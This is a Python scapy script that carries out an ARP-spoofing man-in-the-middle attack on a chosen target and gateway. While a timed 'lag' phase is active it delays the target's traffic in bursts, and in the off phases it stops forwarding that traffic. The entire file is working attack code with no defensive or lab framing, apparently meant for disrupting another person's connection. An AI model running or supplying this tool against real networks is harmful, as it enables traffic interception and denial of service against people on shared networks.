#!/usr/bin/env python3
"""Pulse lag / ghost bursts — alternating lag on and off."""

import sys
import threading
import time

try:
    from scapy.all import ARP, Ether, IP, conf, get_if_hwaddr, getmacbyip, sendp, sniff
except ImportError:
    print("Install scapy: pip install scapy", file=sys.stderr)
    sys.exit(1)


def normalize_mac(mac: str) -> str:
    return mac.replace("-", ":").lower()


def main():
    if len(sys.argv) < 10:
        print(
            "Usage: arp_lag_pulse.py <target_ip> <target_mac> <gateway_ip> <iface> "
            "<incoming_ms> <outgoing_ms> <freeze_ms> <unfreeze_ms> <count>",
            file=sys.stderr,
        )
        sys.exit(1)

    target_ip = sys.argv[1]
    target_mac = normalize_mac(sys.argv[2])
    gateway_ip = sys.argv[3]
    iface = sys.argv[4]
    incoming_ms = max(0, int(sys.argv[5]))
    outgoing_ms = max(0, int(sys.argv[6]))
    freeze_ms = max(50, int(sys.argv[7]))
    unfreeze_ms = max(50, int(sys.argv[8]))
    count = max(1, int(sys.argv[9]))

    conf.iface = iface
    conf.verb = 0
    our_mac = normalize_mac(get_if_hwaddr(iface))
    gateway_mac = None
    lag_active = False
    running = True

    def resolve_gateway_mac():
        nonlocal gateway_mac
        try:
            mac = getmacbyip(gateway_ip)
            if mac:
                gateway_mac = normalize_mac(mac)
        except Exception:
            pass
        return gateway_mac or "ff:ff:ff:ff:ff:ff"

    def poison_loop():
        while running:
            gw_mac = resolve_gateway_mac()
            sendp(
                Ether(dst=target_mac)
                / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=our_mac),
                iface=iface,
                verbose=0,
            )
            sendp(
                Ether(dst=gw_mac)
                / ARP(op=2, pdst=gateway_ip, hwdst=gw_mac, psrc=target_ip, hwsrc=our_mac),
                iface=iface,
                verbose=0,
            )
            time.sleep(2)

    def forward(pkt):
        if IP not in pkt or Ether not in pkt or not lag_active:
            return

        ip = pkt[IP]
        if ip.src == target_ip:
            if outgoing_ms > 0:
                time.sleep(outgoing_ms / 1000.0)
            gw_mac = resolve_gateway_mac()
            sendp(Ether(src=our_mac, dst=gw_mac) / ip, iface=iface, verbose=0)
        elif ip.dst == target_ip:
            if incoming_ms > 0:
                time.sleep(incoming_ms / 1000.0)
            sendp(Ether(src=our_mac, dst=target_mac) / ip, iface=iface, verbose=0)

    def pulse_loop():
        nonlocal lag_active, running
        for i in range(count):
            lag_active = True
            print(f"pulse:{i + 1}:on", flush=True)
            time.sleep(freeze_ms / 1000.0)
            lag_active = False
            print(f"pulse:{i + 1}:off", flush=True)
            if i < count - 1:
                time.sleep(unfreeze_ms / 1000.0)
        running = False

    print(f"Pulse lag {target_ip} x{count} freeze={freeze_ms}ms", flush=True)
    threading.Thread(target=poison_loop, daemon=True).start()
    threading.Thread(target=pulse_loop, daemon=True).start()
    sniff(filter=f"ip host {target_ip}", prn=forward, store=0, promisc=True, iface=iface)


if __name__ == "__main__":
    main()
